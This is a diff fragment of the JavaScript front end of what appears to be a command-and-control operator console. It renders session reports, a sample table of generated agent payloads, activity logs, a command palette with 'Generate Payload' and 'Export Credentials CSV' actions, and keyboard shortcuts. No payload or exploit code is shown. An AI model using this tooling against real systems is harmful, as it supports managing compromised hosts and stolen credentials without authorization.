+  document.getElementById('rpt-preview').textContent = report;
+
+  if (format === 'json') {
+    const json = JSON.stringify({template, generated: new Date().toISOString(), sessions: sessions.map(s=>({id:s.id,host:s.hostname,ip:s.ip,user:s.username,os:s.os,alive:s.alive})), credentials: state.credentials, timeline: state.timeline.slice(0,20)}, null, 2);
+    document.getElementById('rpt-preview').textContent = json;
+  }
+}
+
+/* ── Payloads ─────────────────────────────────────────────────── */
+function renderPayloads() {
+  const payloads = [
+    {name:'python_http_aes',lang:'Python',transport:'HTTP',enc:'AES-256',size:'4.2 KB',created:'2026-06-19'},
+    {name:'csharp_tcp_chacha',lang:'C#',transport:'TCP',enc:'ChaCha20',size:'12.8 KB',created:'2026-06-18'},
+    {name:'ps1_http_aes',lang:'PowerShell',transport:'HTTP',enc:'AES-256',size:'3.1 KB',created:'2026-06-17'},
+    {name:'go_tcp_chacha',lang:'Go',transport:'TCP',enc:'ChaCha20',size:'2.1 MB',created:'2026-06-15'}
+  ];
+  return `
+    <div class="panel">
+      <div class="panel-header">Generated Payloads <button class="btn btn-primary btn-sm" onclick="navigate('builder')" style="margin-left:auto">+ New Payload</button></div>
+      <div class="panel-body no-pad">
+        <table><thead><tr><th>Name</th><th>Language</th><th>Transport</th><th>Encryption</th><th>Size</th><th>Created</th><th>Actions</th></tr></thead>
+        <tbody>${payloads.map(p => `<tr>
+          <td style="color:var(--text);font-family:monospace">${p.name}</td>
+          <td><span class="badge badge-green">${p.lang}</span></td>
+          <td>${p.transport}</td><td>${p.enc}</td><td>${p.size}</td><td>${p.created}</td>
+          <td><button class="btn btn-secondary btn-sm">Download</button></td>
+        </tr>`).join('')}</tbody></table>
+      </div>
+    </div>`;
+}
+
+/* ── Logs ─────────────────────────────────────────────────────── */
+function renderLogs() {
+  const logs = state.timeline.map(e => {
+    const typeColors = {info:'var(--blue)',success:'var(--green)',connect:'var(--green)',disconnect:'var(--red)',cred:'var(--yellow)'};
+    const ts = new Date(e.time).toISOString().slice(11,23);
+    return `<div style="padding:4px 0;font-family:monospace;font-size:12px;border-bottom:1px solid var(--border)"><span style="color:var(--text-muted)">[${ts}]</span> <span style="color:${typeColors[e.type]||'var(--text-dim)'}">[${(e.type||'info').toUpperCase().padEnd(10)}]</span> ${escHtml(e.event)}</div>`;
+  }).join('');
+  return `
+    <div class="panel">
+      <div class="panel-header">Activity Logs
+        <button class="btn btn-secondary btn-sm" onclick="state.timeline=[];renderPage()">Clear</button>
+      </div>
+      <div class="panel-body" style="max-height:calc(100vh - 180px);overflow-y:auto;background:var(--bg-primary);border-radius:var(--radius)">
+        ${logs || '<div style="color:var(--text-muted);padding:20px;text-align:center">No log entries</div>'}
+      </div>
+    </div>`;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   COMMAND PALETTE
+   ═══════════════════════════════════════════════════════════════ */
+const paletteItems = [
+  {label:'Go to Dashboard',action:()=>navigate('dashboard'),shortcut:'Ctrl+1'},
+  {label:'Go to Sessions',action:()=>navigate('sessions'),shortcut:'Ctrl+2'},
+  {label:'Go to Listeners',action:()=>navigate('listeners'),shortcut:'Ctrl+3'},
+  {label:'Go to Agent Builder',action:()=>navigate('builder'),shortcut:'Ctrl+4'},
+  {label:'Go to Credentials',action:()=>navigate('creds'),shortcut:'Ctrl+5'},
+  {label:'Go to Network Map',action:()=>navigate('network'),shortcut:'Ctrl+6'},
+  {label:'Go to Reports',action:()=>navigate('reports'),shortcut:'Ctrl+7'},
+  {label:'Start New Listener',action:()=>{navigate('listeners');}},
+  {label:'Generate Payload',action:()=>navigate('builder')},
+  {label:'Export Credentials CSV',action:()=>exportCredsCSV()},
+  {label:'Toggle Sidebar',action:()=>toggleSidebar()},
+  {label:'Refresh Data',action:()=>renderPage()},
+];
+
+function toggleCmdPalette() {
+  const el = document.getElementById('cmd-palette');
+  el.classList.toggle('open');
+  if (el.classList.contains('open')) {
+    const input = document.getElementById('cmd-palette-input');
+    input.value = '';
+    input.focus();
+    renderPaletteResults('');
+  }
+}
+
+function renderPaletteResults(q) {
+  const container = document.getElementById('cmd-palette-results');
+  const filtered = q ? paletteItems.filter(i => i.label.toLowerCase().includes(q.toLowerCase())) : paletteItems;
+  container.innerHTML = filtered.map((item, i) =>
+    `<div class="cmd-palette-item${i===0?' highlighted':''}" onclick="executePaletteItem(${paletteItems.indexOf(item)})">${item.label}${item.shortcut ? '<span class="shortcut">'+item.shortcut+'</span>' : ''}</div>`
+  ).join('');
+}
+
+function executePaletteItem(idx) {
+  paletteItems[idx].action();
+  toggleCmdPalette();
+}
+
+document.getElementById('cmd-palette-input').addEventListener('input', e => renderPaletteResults(e.target.value));
+document.getElementById('cmd-palette-input').addEventListener('keydown', e => {
+  if (e.key === 'Escape') toggleCmdPalette();
+  if (e.key === 'Enter') {
+    const highlighted = document.querySelector('.cmd-palette-item.highlighted');
+    if (highlighted) highlighted.click();
+  }
+  if (e.key === 'ArrowDown' || e.key === 'ArrowUp') {
+    e.preventDefault();
+    const items = document.querySelectorAll('.cmd-palette-item');
+    let idx = Array.from(items).findIndex(i => i.classList.contains('highlighted'));
+    items.forEach(i => i.classList.remove('highlighted'));
+    idx = e.key === 'ArrowDown' ? Math.min(idx+1, items.length-1) : Math.max(idx-1, 0);
+    if (items[idx]) items[idx].classList.add('highlighted');
+  }
+});
+
+/* Close palette on backdrop click */
+document.getElementById('cmd-palette').addEventListener('click', e => {
+  if (e.target === document.getElementById('cmd-palette')) toggleCmdPalette();
+});
+
+/* ═══════════════════════════════════════════════════════════════
+   SIDEBAR & KEYBOARD SHORTCUTS
+   ═══════════════════════════════════════════════════════════════ */
+function toggleSidebar() {
+  document.getElementById('sidebar').classList.toggle('collapsed');
+  const arrow = document.getElementById('sidebar-toggle');
+  arrow.innerHTML = document.getElementById('sidebar').classList.contains('collapsed') ? '&#9656;' : '&#9666;';
+}
+
+document.getElementById('sidebar-toggle').addEventListener('click', toggleSidebar);
+
+document.querySelectorAll('.nav-item').forEach(item => {
+  item.addEventListener('click', () => navigate(item.dataset.page));
+});
+
+/* Show/hide TLS fields based on listener type */
+document.addEventListener('change', e => {
+  if (e.target.id === 'lst-type') {
+    const tls = document.getElementById('tls-fields');
+    if (tls) tls.style.display = e.target.value === 'HTTPS' ? 'block' : 'none';
+  }
+});
+
+/* Global keyboard shortcuts */
+document.addEventListener('keydown', e => {
+  /* Ctrl+K: command palette */
+  if (e.ctrlKey && e.key === 'k') { e.preventDefault(); toggleCmdPalette(); }
+  /* Ctrl+1 through Ctrl+7: switch sections */
+  const pages = ['dashboard','sessions','listeners','builder','creds','network','reports'];
+  if (e.ctrlKey && e.key >= '1' && e.key <= '7') { e.preventDefault(); navigate(pages[parseInt(e.key)-1]); }
+  /* Ctrl+Enter: send command in terminal */
+  if (e.ctrlKey && e.key === 'Enter') {
+    const ti = document.getElementById('term-input');
+    if (ti && ti.value.trim()) { handleTermKey({key:'Enter',target:ti,preventDefault:()=>{}}); }
+  }
+  /* Escape: close palette or deselect session */
+  if (e.key === 'Escape') {
+    const palette = document.getElementById('cmd-palette');
+    if (palette.classList.contains('open')) { toggleCmdPalette(); }
+    else if (state.selectedSession) { backToSessions(); }
+  }
+});
+
+/* ═══════════════════════════════════════════════════════════════
+   UTILITIES
+   ═══════════════════════════════════════════════════════════════ */
+function escHtml(s) {
+  const div = document.createElement('div');
+  div.textContent = s;
+  return div.innerHTML;
+}
+
+/* Periodic beacon time refresh */
+setInterval(() => {
+  document.querySelectorAll('[data-beacon]').forEach(el => {
+    el.textContent = timeAgo(parseInt(el.dataset.beacon));
+  });
+}, 5000);
+
+/* ═══════════════════════════════════════════════════════════════
+   INIT
+   ═══════════════════════════════════════════════════════════════ */
+(function init() {
+  const hash = window.location.hash.slice(1);
+  if (hash) state.currentPage = hash;
+  navigate(state.currentPage);
+  initSocket();
+})();
+</script>
+</body>
+</html>
